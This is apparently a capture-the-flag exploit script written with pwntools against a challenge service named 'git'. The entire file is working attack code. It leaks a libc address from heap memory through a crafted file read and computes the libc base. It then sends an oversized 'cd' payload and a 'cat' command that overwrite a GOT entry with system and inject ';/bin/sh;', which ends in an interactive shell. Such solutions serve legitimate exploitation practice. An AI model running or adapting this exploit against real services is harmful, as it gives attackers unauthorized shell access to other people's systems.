#!/usr/bin/python3

from pwn import *

exe = ELF('git', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        set follow-fork-mode parent
        set solib-search-path /home/as/kcsc/gittools/share/solves/git/solution
        b*changedir+435
        c
        ''')
        input()

def exploit(filename):
    global p
    i = 0
    while True:
        # if args.REMOTE:
        p = remote('0', 9001)
        # else:
        # p = remote("157.15.86.73",  29085)
        # p = process(exe.path)

        sla(b'> ', b'token TOKEN')
        sla(b'> ', b'repo antkss/lmao')
        res = p.recvline(timeout=5)
        if b'Request timeout' in res:
            p.close()
            continue

        sla(b'> ', f'cat {filename}'.encode())
        res = p.recvuntil(b'C'*8, timeout=5)                               # my files has 8 bytes "C" at the end so it's easier to check
        if not res:
            p.close()
            continue
        try:
            libc_leak = u64(p.recv(6) + b'\0\0')
            libc.address = (libc_leak & 0xfffffffffffff000) - 0x1ec000          # leaked addresses are from main arena so the difference is just offset
            log.info(f"debug: {hex(libc_leak)}")
        except:
            p.close()
            continue

        info("Libc leak: " + hex(libc_leak))
        info("Libc base: " + hex(libc.address))

        if (libc.address & 0xfff or libc.address >> 40 != 0x7f):
            log.critical("Invalid libc base!")
            p.close()
            if i==5:
                return
            i+=1
            continue
        break

    info("System: " + hex(libc.sym.system))
    info("Libc GOT: " + hex(libc.address + 0x1ec0a8 + 0x100))
    # GDB()
    sla(b'> ', b'cd 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
    payload = flat(
        {
            150: b';/bin/sh;',                                                      # Prepare /bin/sh string for snprintf of readfile
            163: libc.address + 0x1ec0a8 + 0x100,
        },
        )
    sla(b'> ', b'cd ' + payload)
    sla(b'> ', b'cat deadbeef'.ljust(0x20, b'\0') + p64(libc.sym.system))           # Overwrite __strlen_avx2@got into system

    p.interactive()

p = None
if __name__=='__main__':
    exploit(hex(0x618))               # This offset is correct
    # for i in range(100):
    #     exploit(hex(0x558 + i*0x10))

